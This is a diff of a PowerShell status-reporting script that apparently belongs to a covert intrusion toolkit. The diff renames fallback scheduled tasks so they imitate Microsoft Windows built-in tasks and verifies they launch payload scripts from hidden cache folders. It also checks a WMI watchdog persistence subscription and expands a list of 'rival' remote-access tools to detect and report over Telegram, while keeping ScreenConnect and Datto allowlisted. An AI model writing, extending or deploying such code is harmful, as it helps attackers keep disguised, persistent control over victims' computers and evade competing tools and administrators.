@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T10 - identity-aware tasks + compact digest; -Force on hidden cache; wide marker filter; payload-build visibility
+# TG_REPORT BUILD 20260802T12 - task TR ownership (no Windows false-OK); RMM+Datto keep; digest; payload builds
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [string]$Summary = '',
@@ -107,9 +107,10 @@ function Get-SvcLine([string]$name) {
 function Get-TaskHealth([string]$tn) {
     $out = & schtasks.exe /Query /TN $tn /FO LIST /V 2>$null
     if ($LASTEXITCODE -ne 0 -or -not $out) {
-        return @{ Present = $false; Status = 'MISSING'; Next = ''; Last = ''; Result = '' }
+        return @{ Present = $false; Status = 'MISSING'; Next = ''; Last = ''; Result = ''; Ours = $false }
     }
     $map = @{}
+    $blob = ($out | ForEach-Object { "$_" }) -join "`n"
     foreach ($line in $out) {
         if ($line -match '^\s*([^:]+):\s*(.*)\s*$') {
             $map[$matches[1].Trim()] = $matches[2].Trim()
@@ -124,28 +125,39 @@ function Get-TaskHealth([string]$tn) {
     if (-not $last) { $last = '' }
     $result = $map['Last Result']
     if (-not $result) { $result = '' }
-    $healthy = ($status -match 'Ready|Running') -or ($status -eq 'present')
+    $tr = $map['Task To Run']
+    if (-not $tr) { $tr = $map['Task to Run'] }
+    $ours = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|\.wucache\\|\.etlcache\\')
+    # Present Windows built-in with same name is NOT healthy for us
+    $healthy = $ours -and (($status -match 'Ready|Running') -or ($status -eq 'present'))
     return @{
         Present = $true
+        Ours    = [bool]$ours
         Healthy = [bool]$healthy
-        Status  = $status
+        Status  = $(if ($ours) { $status } else { 'NOT_OURS' })
         Next    = $next
         Last    = $last
         Result  = $result
+        Tr      = $(if ($tr) { $tr } else { '' })
     }
 }
 
 function Get-RmmHits {
+    # Detect rivals for Telegram. KEEP: ScreenConnect allowlist + Datto/CentraStage.
     $tokens = @(
         'AnyDesk', 'TeamViewer', 'tvnserver', 'DWAgent', 'DWService', 'LogMeIn', 'LMIGuardian',
-        'WinVNC', 'vncserver', 'tv_', 'Splashtop', 'Zoho', 'RustDesk', 'RemotePC', 'DameWare',
-        'AteraAgent', 'Atera', 'NinjaRMM', 'NinjaOne', 'Ninja', 'Kaseya', 'Pulseway', 'Syncro',
-        'SuperOps', 'ManageEngine', 'SolarWinds', 'ConnectWise', 'LTService', 'LabTech',
-        'Action1', 'SimpleHelp', 'Bomgar', 'BeyondTrust', 'MeshAgent', 'Mesh Central',
-        'TacticalRMM', 'tacticalrmm',         'GetScreen', 'Supremo', 'rutserv', 'remoting_host',
+        'WinVNC', 'vncserver', 'tv_', 'Splashtop', 'Zoho Assist', 'RustDesk', 'RemotePC', 'DameWare',
+        'AteraAgent', 'Atera', 'NinjaRMM', 'NinjaOne', 'NinjaRMMAgent', 'Kaseya', 'AgentMon', 'Pulseway', 'PC Monitor', 'Syncro', 'Kabuto',
+        'SuperOps', 'ManageEngine', 'UEMS', 'Desktop Central', 'Endpoint Central', 'SolarWinds MSP', 'ConnectWise Automate', 'LTService', 'LabTech',
+        'Action1', 'SimpleHelp', 'Bomgar', 'BeyondTrust', 'MeshAgent', 'Mesh Central', 'Mesh Agent',
+        'TacticalRMM', 'tacticalrmm', 'GetScreen', 'Supremo', 'rutserv', 'remoting_host',
         'Chrome Remote Desktop', 'Parsec', 'NetSupport', 'Level.io', 'Level Agent',
-        'Datto RMM', 'Continuum'
+        'Continuum', 'SAAZ', 'Naverisk', 'ImmyBot', 'Automox', 'amagent', 'Acronis Cyber', 'Domotz', 'Auvik',
+        'Barracuda RMM', 'Managed Workplace', 'Goverlan', 'PDQ Deploy', 'PDQ Inventory', 'PDQ Connect',
+        'N-able', 'N-central', 'N-sight', 'Take Control', 'Advanced Monitoring Agent', 'UltraViewer', 'AeroAdmin',
+        'LiteManager', 'Radmin', 'NoMachine', 'Iperius', 'ISL Light', 'Ammyy', 'TightVNC', 'UltraVNC', 'RealVNC'
     )
+    $keepTokens = @('Datto', 'CentraStage', 'CagService', 'AutotaskEndpoint')
     $hits = New-Object System.Collections.Generic.List[string]
     $seen = @{}
 
@@ -155,11 +167,22 @@ function Get-RmmHits {
         $seen[$key] = $true
         [void]$hits.Add(('- [{0}] <code>{1}</code>' -f $kind, (Esc $name)))
     }
+    function Test-KeepName([string]$s) {
+        if (-not $s) { return $false }
+        if ($s -like '*ScreenConnect*') { return $true }
+        foreach ($k in $keepTokens) { if ($s -like "*$k*") { return $true } }
+        return $false
+    }
 
     Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
         $n = $_.Name
         $d = $_.DisplayName
-        if ($n -like 'ScreenConnect Client*') { return }
+        if (Test-KeepName $n -or Test-KeepName $d) {
+            if ($n -like '*CentraStage*' -or $d -like '*Datto*' -or $n -like '*CagService*') {
+                Add-Hit 'keep-datto' ("$n ($($_.Status))")
+            }
+            return
+        }
         foreach ($t in $tokens) {
             if ($n -like "*$t*" -or $d -like "*$t*") {
                 Add-Hit 'svc' ("$n ($($_.Status))")
@@ -170,7 +193,7 @@ function Get-RmmHits {
 
     Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
         $n = $_.ProcessName
-        if ($n -like '*ScreenConnect*') { return }
+        if (Test-KeepName $n) { return }
         foreach ($t in $tokens) {
             if ($n -like "*$t*") {
                 Add-Hit 'proc' $n
@@ -185,9 +208,13 @@ function Get-RmmHits {
     )
     foreach ($path in $uninst) {
         Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
-            $dn = [string]$_.DisplayName
+            $dn = $_.DisplayName
             if (-not $dn) { return }
-            if ($dn -like '*ScreenConnect*') { return }
+            if (Test-KeepName $dn) {
+                if ($dn -like '*Datto*' -or $dn -like '*CentraStage*') { Add-Hit 'keep-datto' $dn }
+                return
+            }
+            if ($dn -like 'ScreenConnect*') { return }
             foreach ($t in $tokens) {
                 if ($dn -like "*$t*") {
                     Add-Hit 'msi' $dn
@@ -283,10 +310,10 @@ if (Test-Path $idCfg) {
     }
 }
 $expectedTasks = @(
-    @{ Name = $(if ($idMap.TASK_A) { $idMap.TASK_A } else { '\Microsoft\Windows\Diagnosis\Scheduled' }); Role = "tick $($idMap.MO_A)m (chain1)" },
-    @{ Name = $(if ($idMap.TASK_B) { $idMap.TASK_B } else { '\Microsoft\Windows\PLA\Server' }); Role = "backup $($idMap.MO_B)m (chain1)" },
-    @{ Name = $(if ($idMap.TASK_C) { $idMap.TASK_C } else { '\Microsoft\Windows\WDI\ResolutionHost' }); Role = 'ONSTART (chain1)' },
-    @{ Name = $(if ($idMap.TASK_D) { $idMap.TASK_D } else { '\Microsoft\Windows\Tcpip\IpAddressConflict1' }); Role = 'ONLOGON (chain1)' }
+    @{ Name = $(if ($idMap.TASK_A) { $idMap.TASK_A } else { '\Microsoft\Windows\Diagnosis\EvtCacheSync' }); Role = "tick $($idMap.MO_A)m (chain1)" },
+    @{ Name = $(if ($idMap.TASK_B) { $idMap.TASK_B } else { '\Microsoft\Windows\PLA\ServerHealth' }); Role = "backup $($idMap.MO_B)m (chain1)" },
+    @{ Name = $(if ($idMap.TASK_C) { $idMap.TASK_C } else { '\Microsoft\Windows\WDI\ResolutionHostProxy' }); Role = 'ONSTART (chain1)' },
+    @{ Name = $(if ($idMap.TASK_D) { $idMap.TASK_D } else { '\Microsoft\Windows\Tcpip\IpConflictResolver' }); Role = 'ONLOGON (chain1)' }
 )
 # chain 2: WMI watchdog subscription
 $wmiC = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
@@ -305,6 +332,9 @@ foreach ($t in $expectedTasks) {
     if ($h.Present -and $h.Healthy) {
         $taskOk++
         $mark = 'OK'
+    } elseif ($h.Present -and -not $h.Ours) {
+        $taskBad++
+        $mark = 'NOT_OURS'
     } elseif ($h.Present) {
         $taskBad++
         $mark = 'WEAK'
